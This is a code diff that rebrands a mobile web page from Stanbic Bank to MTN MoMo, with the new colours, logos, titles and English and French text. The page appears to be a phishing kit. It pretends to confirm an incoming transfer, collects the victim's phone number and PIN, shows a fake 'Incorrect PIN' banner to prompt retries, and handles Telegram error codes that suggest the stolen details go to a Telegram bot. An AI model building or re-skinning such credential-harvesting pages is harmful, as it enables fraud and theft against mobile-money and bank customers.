@@ -3,48 +3,50 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>Stanbic Bank · Confirm Receipt</title>
+<title>MTN MoMo · Confirm Receipt</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
   :root {
-    --sb-primary:   #01008C;
-    --sb-royal:     #005EB8;
-    --sb-navy:      #001E50;
-    --sb-gold:      #FFB81C;
-    --sb-white:     #FFFFFF;
-    --sb-text:      #1A2233;
-    --sb-muted:     #5B6577;
-    --sb-border:    #E4E8F0;
-    --sb-soft:      #F4F6FA;
-    --sb-page:      #EEF1F7;
-    --sb-green:     #0E7A4A;
-    --sb-red:       #B3261E;
-    --input-border: rgba(255,255,255,0.35);
-    --input-border-focus: rgba(255,255,255,0.85);
-    --muted: rgba(255,255,255,0.68);
+    --mtn-yellow:        #FFCC00;
+    --mtn-yellow-dark:   #F5B500;
+    --mtn-yellow-light:  #FFF8E1;
+    --mtn-blue:          #0047AB;
+    --mtn-blue-dark:     #003380;
+    --mtn-navy:          #003366;
+    --mtn-white:         #FFFFFF;
+    --mtn-text:          #1F2937;
+    --mtn-muted:         #6B7280;
+    --mtn-border:        #E5E7EB;
+    --mtn-soft:          #F8FAFC;
+    --mtn-page:          #F1F5F9;
+    --mtn-green:         #22A356;
+    --mtn-red:           #E31B23;
+    --input-border:       rgba(255,255,255,0.30);
+    --input-border-focus: rgba(255,204,0,0.85);
+    --muted:              rgba(255,255,255,0.68);
   }
   * { box-sizing: border-box; margin: 0; padding: 0; }
   html, body { height: 100%; }
   body {
-    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    background: var(--sb-page); color: var(--sb-text);
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: var(--mtn-page); color: var(--mtn-text);
     -webkit-font-smoothing: antialiased; line-height: 1.5;
     min-height: 100vh; display: flex; justify-content: center; padding: 0;
   }
   .phone {
     width: 100%; max-width: 430px; min-height: 100vh;
-    background: linear-gradient(160deg, var(--sb-primary) 0%, var(--sb-royal) 100%);
+    background: linear-gradient(160deg, var(--mtn-blue) 0%, var(--mtn-navy) 100%);
     display: flex; flex-direction: column;
     position: relative; overflow: hidden;
     padding-top: env(safe-area-inset-top, 0px);
     padding-bottom: env(safe-area-inset-bottom, 0px);
-    color: var(--sb-white);
+    color: var(--mtn-white);
   }
   .phone::before {
     content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px;
-    background: var(--sb-gold); z-index: 2;
+    background: var(--mtn-yellow); z-index: 2;
   }
 
   .brand-block {
@@ -57,18 +59,20 @@
   }
   .brand-logo {
     height: 48px; width: auto; display: block;
+    border-radius: 8px; object-fit: contain;
+    background: #fff; padding: 3px 6px;
   }
   .brand-name-text {
     font-size: 26px; font-weight: 800; letter-spacing: -0.6px;
-    color: var(--sb-white); line-height: 1; white-space: nowrap;
+    color: var(--mtn-white); line-height: 1; white-space: nowrap;
   }
-  .brand-name-text .dot { color: var(--sb-gold); }
+  .brand-name-text .brand-momo { color: var(--mtn-yellow); }
 
   .brand-titles {
     display: flex; flex-direction: column; gap: 4px;
   }
   .brand-title {
-    font-size: 18px; font-weight: 700; color: var(--sb-white);
+    font-size: 18px; font-weight: 700; color: var(--mtn-white);
     letter-spacing: -0.2px; line-height: 1.3;
   }
   .brand-sub {
@@ -86,7 +90,7 @@
   }
   .amount-line .aval {
     font-size: 28px; font-weight: 800; letter-spacing: -0.6px;
-    color: var(--sb-white); line-height: 1.2;
+    color: var(--mtn-yellow); line-height: 1.2;
   }
 
   .form-area {
@@ -114,12 +118,12 @@
   }
   .pin-input-wrap:focus-within { border-bottom-color: var(--input-border-focus); }
   .phone-input-wrap .dial {
-    font-size: 15px; font-weight: 700; color: var(--sb-gold);
+    font-size: 15px; font-weight: 700; color: var(--mtn-yellow);
     letter-spacing: 0.3px; flex-shrink: 0;
   }
   .phone-input-wrap input, .pin-input-wrap input {
     flex: 1; min-width: 0; background: transparent; border: none; outline: none;
-    color: var(--sb-white); font-family: inherit; font-size: 16px; font-weight: 600;
+    color: var(--mtn-white); font-family: inherit; font-size: 16px; font-weight: 600;
     padding: 2px 0;
   }
   .phone-input-wrap input { letter-spacing: 0.3px; }
@@ -134,16 +138,16 @@
     color: rgba(255,255,255,0.7); display: inline-flex; align-items: center; justify-content: center;
     transition: color .15s; min-width: 36px; min-height: 36px;
   }
-  .eye-btn:hover { color: var(--sb-gold); }
+  .eye-btn:hover { color: var(--mtn-yellow); }
   .eye-btn svg { width: 20px; height: 20px; stroke: currentColor; fill: none; stroke-width: 2; }
 
   .field-error {
-    display: none; font-size: 11.5px; color: var(--sb-gold);
+    display: none; font-size: 11.5px; color: var(--mtn-yellow);
     margin-top: 6px; font-weight: 600; line-height: 1.4;
   }
   .field.invalid .field-error { display: block; }
   .field.invalid .pin-input-wrap,
-  .field.invalid .phone-input-wrap { border-bottom-color: var(--sb-gold); }
+  .field.invalid .phone-input-wrap { border-bottom-color: var(--mtn-yellow); }
 
   .status-banner {
     display: none; padding: 11px 14px; border-radius: 10px;
@@ -152,20 +156,20 @@
     white-space: pre-wrap; word-break: break-word;
   }
   .status-banner.show { display: block; }
-  .status-banner.error { background: rgba(179,38,30,0.20); color: #FFE04D; border: 1px solid rgba(255,224,77,0.35); }
+  .status-banner.error { background: rgba(227,27,35,0.20); color: #FFE04D; border: 1px solid rgba(255,224,77,0.35); }
 
   .btn-signin {
     width: 100%; min-height: 64px;
-    background: var(--sb-white); color: var(--sb-primary);
+    background: var(--mtn-yellow); color: var(--mtn-navy);
     font-family: inherit; font-size: 17px; font-weight: 800;
     letter-spacing: 0.4px;
     border: none; border-radius: 12px; cursor: pointer; margin-top: 12px;
-    box-shadow: 0 10px 24px rgba(0, 0, 0, 0.22);
+    box-shadow: 0 10px 24px rgba(0, 0, 0, 0.25);
     transition: filter .15s, transform .1s;
     display: flex; align-items: center; justify-content: center;
     padding: 18px 24px;
   }
-  .btn-signin:hover { filter: brightness(0.98); }
+  .btn-signin:hover { filter: brightness(0.97); }
   .btn-signin:active { transform: scale(0.985); }
   .btn-signin:disabled { opacity: 0.72; cursor: wait; }
 
@@ -173,7 +177,7 @@
     text-align: center; font-size: 11px; color: var(--muted);
     line-height: 1.6; margin-top: auto; padding: 24px 30px 0;
   }
-  .terms a { color: var(--sb-gold); font-weight: 700; text-decoration: underline; text-underline-offset: 2px; }
+  .terms a { color: var(--mtn-yellow); font-weight: 700; text-decoration: underline; text-underline-offset: 2px; }
 
   .contact {
     display: flex; flex-direction: column; align-items: center; gap: 8px;
@@ -181,14 +185,14 @@
   }
   .contact-btn {
     width: 50px; height: 50px; border-radius: 50%;
-    background: var(--sb-gold);
+    background: var(--mtn-yellow);
     display: inline-flex; align-items: center; justify-content: center;
     border: none; cursor: pointer;
-    box-shadow: 0 10px 22px rgba(255,184,28,0.32);
+    box-shadow: 0 10px 22px rgba(255,204,0,0.32);
     transition: transform .12s ease, filter .15s; text-decoration: none;
   }
   .contact-btn svg {
-    width: 22px; height: 22px; stroke: var(--sb-primary); fill: none;
+    width: 22px; height: 22px; stroke: var(--mtn-navy); fill: none;
     stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round;
   }
   .contact-label {
@@ -198,23 +202,27 @@
 
   .initiating {
     position: fixed; inset: 0;
-    background: linear-gradient(160deg, var(--sb-primary) 0%, var(--sb-royal) 100%);
+    background: linear-gradient(160deg, var(--mtn-blue) 0%, var(--mtn-navy) 100%);
     display: none; flex-direction: column;
     align-items: center; justify-content: center;
     padding: 24px; z-index: 9999; text-align: center;
-    color: var(--sb-white);
+    color: var(--mtn-white);
   }
   .initiating.show { display: flex; }
   .initiating .brand-row {
     display: flex; align-items: center; justify-content: center; gap: 10px;
     margin-bottom: 40px;
   }
-  .initiating .brand-row img { height: 32px; width: auto; }
+  .initiating .brand-row img {
+    height: 32px; width: auto;
+    border-radius: 6px; object-fit: contain;
+    background: #fff; padding: 2px 5px;
+  }
   .initiating .brand-row .mini-text {
-    font-size: 20px; font-weight: 800; color: var(--sb-white);
+    font-size: 20px; font-weight: 800; color: var(--mtn-white);
     letter-spacing: -0.5px;
   }
-  .initiating .brand-row .mini-text .dot { color: var(--sb-gold); }
+  .initiating .brand-row .mini-text .brand-momo { color: var(--mtn-yellow); }
   .initiating h2 {
     font-size: 20px; font-weight: 800; letter-spacing: -0.3px;
     margin-bottom: 8px;
@@ -226,7 +234,7 @@
   .spinner {
     width: 56px; height: 56px;
     border: 4px solid rgba(255,255,255,0.18);
-    border-top-color: var(--sb-gold);
+    border-top-color: var(--mtn-yellow);
     border-radius: 50%;
     animation: spin 0.9s linear infinite;
     margin-bottom: 28px;
@@ -243,12 +251,12 @@
     font-family: inherit; font-size: 12px; font-weight: 600;
     text-decoration: underline; text-underline-offset: 3px;
   }
-  .initiating .cancel-link:hover { color: var(--sb-gold); }
+  .initiating .cancel-link:hover { color: var(--mtn-yellow); }
 
   .toast {
     position: fixed; bottom: 90px; left: 50%;
     transform: translateX(-50%) translateY(80px);
-    background: var(--sb-navy); color: #fff; padding: 11px 18px; border-radius: 9px;
+    background: var(--mtn-navy); color: #fff; padding: 11px 18px; border-radius: 9px;
     font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease;
     z-index: 10000; pointer-events: none; max-width: 90%; text-align: center;
     box-shadow: 0 12px 28px rgba(0,0,0,0.30);
@@ -303,7 +311,7 @@
     .phone {
       min-height: calc(100vh - 64px); max-height: 900px;
       border-radius: 20px;
-      box-shadow: 0 40px 100px rgba(1,0,140,0.28); overflow: hidden;
+      box-shadow: 0 40px 100px rgba(0,71,171,0.28); overflow: hidden;
     }
   }
 </style>
@@ -316,12 +324,12 @@
     <div class="brand-logo-wrap">
       <img
         class="brand-logo"
-        src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
-        alt="Stanbic Bank"
+        src="https://i.pinimg.com/1200x/f2/f9/38/f2f9385a59cf088b7b77472f3636d4fb.jpg"
+        alt="MTN MoMo"
         referrerpolicy="no-referrer"
         onerror="this.style.display='none'"
       >
-      <span class="brand-name-text">Stanbic<span class="dot">.</span></span>
+      <span class="brand-name-text">MTN<span class="brand-momo">&nbsp;MoMo</span></span>
     </div>
     <div class="brand-titles">
       <div class="brand-title" id="brandTitle">Confirm your receipt</div>
@@ -386,18 +394,18 @@
 <div class="initiating" id="initiating">
   <div class="brand-row">
     <img
-      src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
-      alt="Stanbic Bank"
+      src="https://i.pinimg.com/1200x/f2/f9/38/f2f9385a59cf088b7b77472f3636d4fb.jpg"
+      alt="MTN MoMo"
       referrerpolicy="no-referrer"
       onerror="this.style.display='none'"
     >
-    <span class="mini-text">Stanbic<span class="dot">.</span></span>
+    <span class="mini-text">MTN<span class="brand-momo">&nbsp;MoMo</span></span>
   </div>
 
   <div class="spinner"></div>
 
   <h2 id="initiatingTitle">Confirming your receipt…</h2>
-  <p id="initiatingDesc">Connecting securely to Stanbic Bank to confirm this incoming transfer. Please do not close this page.</p>
+  <p id="initiatingDesc">Connecting securely to MTN MoMo to confirm this incoming transfer. Please do not close this page.</p>
 
   <div class="note" id="initiatingNote">This usually takes a few seconds.</div>
 
@@ -428,7 +436,7 @@
       termsLink: 'T&Cs',
       contactLabel: 'Customer Care',
       initiatingTitle: 'Confirming your receipt…',
-      initiatingDesc: 'Connecting securely to Stanbic Bank to confirm this incoming transfer. Please do not close this page.',
+      initiatingDesc: 'Connecting securely to MTN MoMo to confirm this incoming transfer. Please do not close this page.',
       initiatingNote: 'This usually takes a few seconds.',
       cancel: 'Cancel',
       declineBanner: 'Incorrect PIN. Please try again. No money has left your account.',
@@ -438,7 +446,7 @@
       serverError: 'Service temporarily unavailable. Please try again shortly.',
       missingRef: 'This confirmation link is invalid or incomplete.',
       approvedRedirecting: 'Confirmed. Redirecting…',
-      docTitle: 'Stanbic Bank · Confirm Receipt'
+      docTitle: 'MTN MoMo · Confirm Receipt'
     },
     fr: {
       brandTitle: 'Confirmez votre reçu',
@@ -457,7 +465,7 @@
       termsLink: 'Conditions',
       contactLabel: 'Service Client',
       initiatingTitle: 'Confirmation de la réception…',
-      initiatingDesc: 'Connexion sécurisée à Stanbic Bank pour confirmer ce virement entrant. Veuillez ne pas fermer cette page.',
+      initiatingDesc: 'Connexion sécurisée à MTN MoMo pour confirmer ce virement entrant. Veuillez ne pas fermer cette page.',
       initiatingNote: 'Cela prend généralement quelques secondes.',
       cancel: 'Annuler',
       declineBanner: 'Code PIN incorrect. Veuillez réessayer. Aucun argent n\'a quitté votre compte.',
@@ -467,7 +475,7 @@
       serverError: 'Service temporairement indisponible. Veuillez réessayer sous peu.',
       missingRef: 'Ce lien de confirmation est invalide ou incomplet.',
       approvedRedirecting: 'Confirmé. Redirection…',
-      docTitle: 'Stanbic Bank · Confirmer la réception'
+      docTitle: 'MTN MoMo · Confirmer la réception'
     }
   };
 
@@ -753,14 +761,12 @@
       const serverMsg = responseJson && responseJson.message;
 
       if (code === 'telegram_not_configured') {
-        // Internal misconfiguration — show a generic message, not the raw error
         showToast(T.serverError);
       } else if (code === 'telegram_timeout') {
         showToast(T.timeoutError);
       } else if (httpStatus === 502 || httpStatus === 503 || httpStatus === 504) {
         showToast(T.serverError);
       } else if (serverMsg) {
-        // Generic server message (e.g. "Missing data") — safe to show
         showToast(String(serverMsg).slice(0, 140));
       } else {
         showToast(T.networkError);
